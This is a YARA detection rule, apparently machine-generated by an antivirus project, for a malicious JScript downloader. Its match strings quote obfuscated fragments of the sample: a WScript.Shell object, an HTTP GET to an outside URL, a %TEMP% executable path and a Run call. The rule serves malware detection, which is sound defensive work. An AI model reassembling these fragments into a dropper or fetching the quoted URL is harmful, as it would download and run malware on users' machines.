rule sig_20160328_7ae3f0bb4b4a021de1101e9d0f4cc74b {
  meta:
    description = "datamaliciousorder - file 20160328_7ae3f0bb4b4a021de1101e9d0f4cc74b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0ffdf1431d0f378382a421a5dde5cae287c36c7872843ccbe60988b81068c679"

  strings:
    $s1  = "function Vzlegqei() {return Jnijtzqq[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"j10QYdEAWFbGfW.exe\";};" fullword ascii
    $s2  = "Qpdfqf[Ahtgtwptq](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "do {WScript[Tkrkcbjl](Zqthy() * 11)} while (Qpdfqf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Jnijtzqq = function Lrovjcw() {return WScript[Lkqujv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xhipsl(Htqdj, Jxegg){return Htqdj - Jxegg;};" fullword ascii
    $s6  = "function Utwxm(Czapapypfz){Jnijtzqq[\"Run\"](Czapapypfz, Jbcsv, Jbcsv);};" fullword ascii
    $s7  = "function Ifkablus() {return ((Womzxjwn == true) && (Womzxjwn == Byeycbfaou)) ? 1 : Jbcsv;};" fullword ascii
    $s8  = "var Rhlnke = false;" fullword ascii
    $s9  = "function Ewfnm(Zpgezemk) {var Ktsfklx = (1, 2, 3, 4, 5, Zpgezemk); return Ktsfklx;};" fullword ascii
    $s10 = "function Aznakqyq(){return Lkqujv;};" fullword ascii
    $s11 = "Byeycbfaou = true; " fullword ascii
    $s12 = "function Zgjtgjo()" fullword ascii
    $s13 = "function Zqthy(){return 22;};" fullword ascii
    $s14 = "return Xhipsl(Ufhojvoov, Zzdrllcguy);" fullword ascii
    $s15 = "var Womzxjwn = false;" fullword ascii
    $s16 = "Womzxjwn = true; " fullword ascii
    $s17 = "var Byeycbfaou = false;" fullword ascii
    $s18 = " while (Nixeuzycor){" fullword ascii
    $s19 = "var Fyhxjz = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Jkstwa){Nixeuzycor = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}